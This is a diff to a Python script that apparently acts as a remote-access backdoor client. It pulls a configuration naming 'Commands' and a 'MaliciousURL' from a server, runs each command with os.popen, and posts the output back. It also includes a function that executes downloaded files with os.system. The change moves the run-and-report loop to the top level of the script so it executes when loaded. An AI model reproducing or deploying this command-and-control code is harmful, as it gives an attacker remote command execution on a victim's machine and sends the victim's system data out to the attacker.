@@ -1,7 +1,6 @@
 import requests
 import json
 import sys, string, os
-import ast
 #https://stackoverflow.com/questions/25707558/json-valueerror-expecting-property-name-line-1-column-2-char-1
 
 SERVERADDRESS = 'http://localhost'
@@ -24,22 +23,23 @@ def HttpPostRequest(path, parameters):
     return r.text
 
 def conf():
-    #conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
-    conf = ast.literal_eval(HttpGetRequest(CONFIGURATIONPATH,None))
+
+    global SERVERADDRESS
+    global COMMANDSTOEXE
+    global MALICIOUSURL
+
+    conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
+    print(conf)
     #print(json.dumps(conf))
-    SERVERADDRESS = conf['Server']
+    SERVERADDRESS = 'http://'+conf['Server']
     COMMANDSTOEXE = conf['Commands']
     MALICIOUSURL = conf['MaliciousURL']
-    #print("This is the conf:")
-    for command in COMMANDSTOEXE:
-        HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
 
 
 def RunCommand(command):
     run = os.popen(command)
     results = run.read()
     run.close()
-    #print(run)
     return results
 
 def PreperToSend(type,str):
@@ -66,7 +66,9 @@ def RunExeFile(file):
     os.system(file)
 
 conf()
-
+print(COMMANDSTOEXE)
+for command in COMMANDSTOEXE:
+    HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
 #print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))
 
 #file = DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg')
